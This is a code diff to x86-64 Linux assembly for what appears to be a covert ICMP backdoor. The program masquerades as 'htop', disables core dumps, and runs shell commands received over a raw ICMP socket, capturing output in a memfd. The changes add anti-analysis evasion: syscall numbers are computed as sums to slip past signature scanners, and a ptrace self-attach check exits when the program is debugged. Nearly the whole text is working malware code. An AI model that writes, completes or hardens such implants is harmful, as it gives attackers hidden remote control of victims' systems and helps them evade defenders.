@@ -51,7 +51,8 @@ global _start
 _start:
     call _htop_masquerade
     call _disable_memory_dump
-
+	call _anti_debugging
+	
     mov rax,[fake_name]
     mov rdi,[rsp+8]
     mov [rdi],rax
@@ -70,7 +71,8 @@ _start:
     syscall
 
     ; Step 3: Create Raw ICMP Socket
-    mov rax, 41                 ; sys_socket
+    mov rax, 40
+    add rax, 1                 ; sys_socket
     mov rdi, 2                  ; AF_INET
     mov rsi, 3                  ; SOCK_RAW
     mov rdx, 1                  ; IPPROTO_ICMP
@@ -248,7 +250,8 @@ _execute_command:
     call _memfd_create              ; Create anonymous RAM file for output capture
     push rax                        ; Save memfd FD
 
-    mov rax, 57                     ; sys_fork
+    mov rax, 50
+    add rax, 7                     ; sys_fork
     syscall
     cmp rax, 0               
     je _execve                      ; Child process handles execution
@@ -391,7 +394,8 @@ _execve:
     call _dup2                      
 
     ; Execute shell command
-    mov rax, 59                     ; sys_execve
+    mov rax, 50
+    add rax, 9                     ; sys_execve
     mov rdi, str_sh                 
     mov rsi, argv_array             
     mov rdx, 0                      
@@ -415,7 +419,8 @@ _lseek:
     ret
 
 _memfd_create:
-    mov rax, 319                    ; sys_memfd_create
+	mov rax, 300
+    add rax, 19                    ; sys_memfd_create
     mov rdi, dir                    
     mov rsi, 0                      
     syscall
@@ -475,6 +480,17 @@ _disable_memory_dump:
     syscall
     ret
 
+_anti_debugging:
+	mov rax, 91
+	add rax, 10						; sys_ptrace
+	xor rdi,rdi						; PTRACE_TRACEME (0)
+	xor rsi,rsi
+	xor rdx,rdx
+	xor r10,r10
+	syscall
+	test rax,rax
+	js _exit
+	ret
 
 
 _exit:
